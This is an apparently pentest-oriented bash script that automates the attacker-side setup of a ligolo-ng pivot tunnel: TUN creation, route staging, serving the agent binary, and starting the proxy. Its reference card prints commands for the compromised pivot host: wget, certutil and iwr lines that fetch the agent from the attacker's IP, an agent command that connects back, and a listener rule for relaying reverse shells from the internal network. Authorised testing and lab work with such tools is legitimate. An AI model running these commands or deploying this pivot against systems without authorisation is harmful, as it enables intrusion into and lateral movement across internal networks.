#!/usr/bin/env bash
# ligolo-setup.sh -- attacker-side ligolo-ng setup, one command to a fully-routed pivot.
# Only the attacker side is executable here -- the agent binary runs on the pivot host, which this
# script has no access to, so it prints the exact copy-paste command for that side (and can serve the
# agent binary over the VPN so getting it onto the pivot is a single wget/certutil line).
#
# Usage:
#   ligolo-setup.sh [--route CIDR]... [--port N] [--serve [DIR]] [--name IFACE]
#                               create the TUN, pre-stage routes, (optionally) serve the agent,
#                               then start the proxy listener in the foreground.
#   ligolo-setup.sh --teardown [--name IFACE]
#                               remove the TUN interface, stop a proxy/file-server this script started.
# --name lets a second hop use its own interface (e.g. --name ligolo2) with no script edit.
#
# Fast path (zero wasted time): if you already know the target's internal subnet from your first-box
# recon, pass it with --route so the kernel route is in place before the proxy even starts -- then the
# only in-console step is `session` -> pick the agent -> `start`, and every native tool reaches the
# internal net immediately. Example:
#   ./ligolo-setup.sh --route 10.10.20.0/24 --serve
set -uo pipefail

# --name overrides the TUN interface name (a second, distinctly-named hop on a double pivot, so you
# never edit this script). Pre-scanned here because teardown runs before the main arg parser, and the
# pid/serve state files are namespaced per interface so two concurrent pivots don't clobber each other.
TUN_NAME="ligolo"
TEARDOWN=0
for ((_i=1; _i<=$#; _i++)); do
    case "${!_i}" in
        --name)     _j=$((_i+1)); TUN_NAME="${!_j:-ligolo}" ;;
        --teardown) TEARDOWN=1 ;;
    esac
done
PID_FILE="${XDG_RUNTIME_DIR:-/tmp}/.ligolo-setup-proxy-${TUN_NAME}.pid"
SERVE_PID_FILE="${XDG_RUNTIME_DIR:-/tmp}/.ligolo-setup-serve-${TUN_NAME}.pid"
SERVE_DIR_FILE="${XDG_RUNTIME_DIR:-/tmp}/.ligolo-setup-serve-${TUN_NAME}.dir"
PORT_FILE="${XDG_RUNTIME_DIR:-/tmp}/.ligolo-setup-port-${TUN_NAME}.port"
SERVE_PORT_DEFAULT=8080

# ---------------------------------------------------------------------------
# Teardown
# ---------------------------------------------------------------------------
if [[ $TEARDOWN -eq 1 ]]; then
    echo "[*] Tearing down ligolo-ng TUN interface, proxy, and file server."

    # Proxy runs as root (started via `exec sudo ...`), so an unprivileged kill returns EPERM and would
    # silently "succeed" without stopping it -- route the kill through sudo unless we are already root.
    KILL_PREFIX=""
    [[ $EUID -ne 0 ]] && command -v sudo >/dev/null 2>&1 && KILL_PREFIX="sudo"
    if [[ -f "$PID_FILE" ]]; then
        PID="$(cat "$PID_FILE")"
        if [[ -n "$PID" ]] && $KILL_PREFIX kill -0 "$PID" 2>/dev/null; then
            echo "[*] Killing proxy process (pid $PID)"
            $KILL_PREFIX kill "$PID"
        else
            echo "[*] No running proxy found for recorded pid ${PID:-<none>} -- probably already stopped."
        fi
        rm -f "$PID_FILE"
    fi
    # Belt-and-braces: the recorded PID is sudo's, and on older sudo (or a detached proxy) the SIGTERM
    # may not reach the proxy child, orphaning it still bound to the listener. Sweep ONLY this
    # interface's proxy, matched by its recorded listen port, so a concurrent pivot is left running.
    if [[ -f "$PORT_FILE" ]]; then
        _port="$(cat "$PORT_FILE")"
        if [[ -n "$_port" ]] && command -v pgrep >/dev/null 2>&1 \
           && pgrep -f "proxy -selfcert -laddr 0.0.0.0:${_port}" >/dev/null 2>&1; then
            echo "[*] Sweeping a leftover ligolo proxy on port ${_port}."
            $KILL_PREFIX pkill -f "proxy -selfcert -laddr 0.0.0.0:${_port}" 2>/dev/null || true
        fi
        rm -f "$PORT_FILE"
    fi

    # Agent file server (unprivileged, ours).
    if [[ -f "$SERVE_PID_FILE" ]]; then
        SPID="$(cat "$SERVE_PID_FILE")"
        if [[ -n "$SPID" ]] && kill -0 "$SPID" 2>/dev/null; then
            echo "[*] Stopping agent file server (pid $SPID)"
            kill "$SPID"
        fi
        rm -f "$SERVE_PID_FILE"
    fi
    if [[ -f "$SERVE_DIR_FILE" ]]; then
        SDIR="$(cat "$SERVE_DIR_FILE")"
        # Only remove a dir we created under a temp root -- never anything else.
        if [[ -n "$SDIR" && "$SDIR" == "${TMPDIR:-/tmp}/ligolo-serve."* && -d "$SDIR" ]]; then
            rm -rf "$SDIR"
        fi
        rm -f "$SERVE_DIR_FILE"
    fi

    # Deleting the interface also drops every route bound to it, so routes need no separate cleanup.
    if ip link show "$TUN_NAME" >/dev/null 2>&1; then
        sudo ip link delete "$TUN_NAME"
        echo "[*] Deleted TUN interface '$TUN_NAME' (its routes went with it)."
    else
        echo "[*] No '$TUN_NAME' interface present -- nothing to delete."
    fi
    echo "[!] Reminder: this can't reach the pivot host -- Ctrl+C the 'agent' process there manually."
    exit 0
fi

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
ROUTES=()
SERVE=0
SERVE_SRC_DIR="."
LISTEN_PORT="${LIGOLO_PORT:-11601}"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --route)
            [[ $# -lt 2 ]] && { echo "[!] --route requires a CIDR, e.g. --route 10.10.20.0/24" >&2; exit 1; }
            ROUTES+=("$2"); shift 2 ;;
        --port)
            [[ $# -lt 2 ]] && { echo "[!] --port requires a number" >&2; exit 1; }
            LISTEN_PORT="$2"; shift 2 ;;
        --serve)
            SERVE=1
            # Optional directory argument (must not look like another flag).
            if [[ $# -ge 2 && "${2:0:1}" != "-" ]]; then
                SERVE_SRC_DIR="$2"; shift 2
            else
                shift
            fi ;;
        --name)
            # Already consumed by the pre-scan above into TUN_NAME; just skip it here.
            [[ $# -lt 2 ]] && { echo "[!] --name requires an interface name, e.g. --name ligolo2" >&2; exit 1; }
            shift 2 ;;
        -h|--help)
            sed -n '2,19p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
        *)
            echo "[!] Unknown argument: $1" >&2
            echo "    Usage: $0 [--route CIDR]... [--port N] [--serve [DIR]] [--name IFACE] | --teardown [--name IFACE]" >&2
            exit 1 ;;
    esac
done

if ! [[ "$LISTEN_PORT" =~ ^[0-9]+$ ]] || (( LISTEN_PORT < 1 || LISTEN_PORT > 65535 )); then
    echo "[!] --port must be a number between 1 and 65535 (got '$LISTEN_PORT')." >&2
    exit 1
fi

# ---------------------------------------------------------------------------
# Locate the proxy binary
# ---------------------------------------------------------------------------
PROXY_BIN="./proxy"
if ! command -v "$PROXY_BIN" >/dev/null 2>&1 && [[ ! -x "$PROXY_BIN" ]]; then
    if command -v proxy >/dev/null 2>&1; then
        PROXY_BIN="proxy"
    else
        echo "[!] ligolo-ng 'proxy' binary not found in cwd or PATH." >&2
        echo "    Download: https://github.com/nicocha30/ligolo-ng/releases" >&2
        exit 1
    fi
fi

# ---------------------------------------------------------------------------
# TUN interface
# ---------------------------------------------------------------------------
if ip link show "$TUN_NAME" >/dev/null 2>&1; then
    echo "[*] TUN interface '$TUN_NAME' already exists -- skipping creation."
else
    echo "[*] Creating TUN device '$TUN_NAME'"
    sudo ip tuntap add dev "$TUN_NAME" mode tun user "$(whoami)" && sudo ip link set "$TUN_NAME" up
fi

# Pre-stage kernel routes now (interface is up), so once you `start` in the console traffic flows with
# no second terminal and no subnet-discovery round trip. Each route is idempotent -- an existing one is
# reported, not treated as an error.
for cidr in ${ROUTES[@]+"${ROUTES[@]}"}; do
    if ip route show "$cidr" 2>/dev/null | grep -q "dev $TUN_NAME"; then
        echo "[*] Route $cidr -> $TUN_NAME already present."
    elif sudo ip route add "$cidr" dev "$TUN_NAME" 2>/dev/null; then
        echo "[*] Added route $cidr -> $TUN_NAME."
    else
        echo "[!] Could not add route $cidr (bad CIDR, or it conflicts with an existing route)." >&2
    fi
done

# ---------------------------------------------------------------------------
# Attacker VPN IP (the agent must reach us over the engagement VPN, not the LAN)
# ---------------------------------------------------------------------------
ATTACKER_IP=""
for vpn_if in tun0 tun1 tap0 ligolo-vpn; do
    [[ "$vpn_if" == "$TUN_NAME" ]] && continue   # our own pivot TUN is not the VPN
    if ip link show "$vpn_if" >/dev/null 2>&1; then
        ATTACKER_IP="$(ip -4 -o addr show dev "$vpn_if" 2>/dev/null | grep -oP '(?<=inet )[0-9.]+' | head -n1)"
        [[ -n "$ATTACKER_IP" ]] && { echo "[*] Using VPN interface '$vpn_if' address: $ATTACKER_IP"; break; }
    fi
done
if [[ -z "$ATTACKER_IP" ]]; then
    ATTACKER_IP="$(ip route get 1.1.1.1 2>/dev/null | grep -oP '(?<=src )\S+')"
    [[ -n "$ATTACKER_IP" ]] && \
        echo "[!] No VPN interface (tun0/tun1/tap0) found -- falling back to the default-route address $ATTACKER_IP." >&2 && \
        echo "    If the target reaches you over a VPN, this is probably the WRONG address; override it by hand." >&2
fi
if [[ -z "$ATTACKER_IP" ]]; then
    ATTACKER_IP="<YOUR_ATTACKER_IP>"
    echo "[!] Could not auto-detect attacker IP -- fill it in manually below." >&2
fi

# ---------------------------------------------------------------------------
# Optional: serve the agent binary over the VPN so transferring it is one line on the pivot.
# Served from a dedicated temp dir (copies only), bound to the VPN IP -- never exposes your cwd/loot.
# ---------------------------------------------------------------------------
SERVE_URL=""
if [[ $SERVE -eq 1 ]]; then
    if ! command -v python3 >/dev/null 2>&1; then
        echo "[!] --serve needs python3 for 'http.server' -- skipping the file server." >&2
    else
        mapfile -t FOUND_AGENTS < <(find "$SERVE_SRC_DIR" -maxdepth 1 -type f \( -name 'agent' -o -name 'agent.exe' \) 2>/dev/null)
        if [[ ${#FOUND_AGENTS[@]} -eq 0 ]]; then
            echo "[!] --serve requested but no 'agent'/'agent.exe' found in '$SERVE_SRC_DIR' -- skipping the file server." >&2
        else
            # Pick the first free port at/after the default, so a second concurrent --serve pivot gets
            # its own port instead of silently colliding on 8080.
            SERVE_PORT="$SERVE_PORT_DEFAULT"
            for _p in $(seq "$SERVE_PORT_DEFAULT" $((SERVE_PORT_DEFAULT + 9))); do
                if ! (exec 3<>"/dev/tcp/${ATTACKER_IP}/${_p}") 2>/dev/null; then SERVE_PORT="$_p"; break; fi
            done
            SERVE_DIR="$(mktemp -d "${TMPDIR:-/tmp}/ligolo-serve.XXXXXX")"
            for a in "${FOUND_AGENTS[@]}"; do cp "$a" "$SERVE_DIR/"; done
            ( cd "$SERVE_DIR" && exec python3 -m http.server "$SERVE_PORT" --bind "$ATTACKER_IP" ) \
                >/dev/null 2>&1 &
            _spid=$!
            # Verify it actually came up: python's http.server exits instantly on a bad bind (port busy,
            # unusable IP), and we must never print a working-looking URL for a server that never started.
            sleep 0.4
            if kill -0 "$_spid" 2>/dev/null; then
                echo "$_spid" > "$SERVE_PID_FILE"
                echo "$SERVE_DIR" > "$SERVE_DIR_FILE"
                SERVE_URL="http://${ATTACKER_IP}:${SERVE_PORT}"
                echo "[*] Serving $(printf '%s ' "${FOUND_AGENTS[@]##*/}")on $SERVE_URL  (stop with --teardown)"
            else
                echo "[!] Agent file server failed to start (port ${SERVE_PORT} busy, or can't bind ${ATTACKER_IP})." >&2
                echo "    Proceeding without it -- transfer the agent to the pivot by your own means." >&2
                rm -rf "$SERVE_DIR"
            fi
        fi
    fi
fi

# ---------------------------------------------------------------------------
# Reference card
# ---------------------------------------------------------------------------
echo
echo "=================================================================="
if [[ -n "$SERVE_URL" ]]; then
    echo "Get the agent onto the PIVOT HOST (pick the one that matches the box):"
    echo "  Linux :  wget $SERVE_URL/agent -O /tmp/agent && chmod +x /tmp/agent"
    echo "  Windows: certutil -urlcache -split -f $SERVE_URL/agent.exe agent.exe"
    echo "           (or)  iwr $SERVE_URL/agent.exe -OutFile agent.exe"
    echo
fi
echo "Once the proxy below is listening, run this on the PIVOT HOST:"
echo
# If we served the agent, the download line above drops it at /tmp/agent; otherwise the operator placed
# it themselves, so show the path-agnostic ./agent rather than guessing a location.
AGENT_LINUX_PATH="./agent"; [[ -n "$SERVE_URL" ]] && AGENT_LINUX_PATH="/tmp/agent"
echo "  Linux :  $AGENT_LINUX_PATH -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry"
echo "  Windows: .\\agent.exe -connect ${ATTACKER_IP}:${LISTEN_PORT} -ignore-cert -retry"
echo
echo "Then, in the proxy console that starts below:"
echo "  session                 # list/select the connected agent"
echo "  ifconfig                # view the target's interfaces/subnets"
echo "  start                   # bring the tunnel up and begin routing"
echo "                          #   (ligolo-ng 0.8.x console? use: tunnel_start --tun ${TUN_NAME})"
echo
if [[ ${#ROUTES[@]} -gt 0 ]]; then
    echo "Routes already staged -- after 'start', these reach the internal net immediately:"
    for cidr in "${ROUTES[@]}"; do echo "    $cidr  dev $TUN_NAME"; done
else
    echo "After 'ifconfig' shows the internal subnet, add its route (separate terminal):"
    echo "  sudo ip route add <discovered_subnet>/24 dev $TUN_NAME"
    echo "  (next time, pass --route <subnet>/24 to stage this before the proxy even starts)"
fi
echo
echo "Catch a reverse shell FROM the internal net back through the pivot:"
echo "  listener_add --addr 0.0.0.0:<pivot_port> --to 127.0.0.1:<local_catch_port> --tcp"
echo "  then point your internal-host payload at <pivot_internal_ip>:<pivot_port>"
echo
echo "Second hop (double pivot): rerun as  $0 --name ${TUN_NAME}2 --route <next_subnet>/24  for"
echo "the second agent (no script edit needed); start it on that session."
echo "=================================================================="
echo
echo "[*] Starting proxy on 0.0.0.0:${LISTEN_PORT} in the foreground -- Ctrl+C to stop, then '$0 --teardown'."
# `exec` replaces this shell, so $$ becomes the PID of `sudo` (which forwards signals to its proxy child
# on modern sudo). Teardown kills this PID, with a pkill sweep as a fallback for older sudo.
echo "$$" > "$PID_FILE"
echo "$LISTEN_PORT" > "$PORT_FILE"
exec sudo "$PROXY_BIN" -selfcert -laddr "0.0.0.0:${LISTEN_PORT}"
